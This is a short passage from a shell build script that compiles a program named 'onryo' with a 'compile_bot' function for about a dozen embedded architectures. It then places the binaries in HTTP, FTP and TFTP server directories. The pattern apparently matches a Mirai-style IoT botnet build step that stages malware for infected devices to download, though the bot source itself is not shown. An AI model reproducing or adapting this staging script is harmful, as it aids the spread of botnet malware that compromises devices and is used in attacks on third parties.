...
compile_bot i586 onryo.x86 "-static"
compile_bot mips onryo.mips "-static"
compile_bot mipsel onryo.mpsl "-static"
compile_bot armv4l onryo.arm "-static"
compile_bot armv5l onryo.arm5 ""
compile_bot armv6l onryo.arm6 "-static"
compile_bot armv7l onryo.arm7 "-static"
compile_bot powerpc onryo.ppc "-static"
compile_bot sparc onryo.spc "-static"
compile_bot m68k onryo.m68k "-static"
compile_bot sh4 onryo.sh4 "-static"

cp release/onryo.* /var/www/html/bins
cp release/onryo.* /var/ftp
mv release/onryo.* /var/lib/tftpboot
rm -rf release
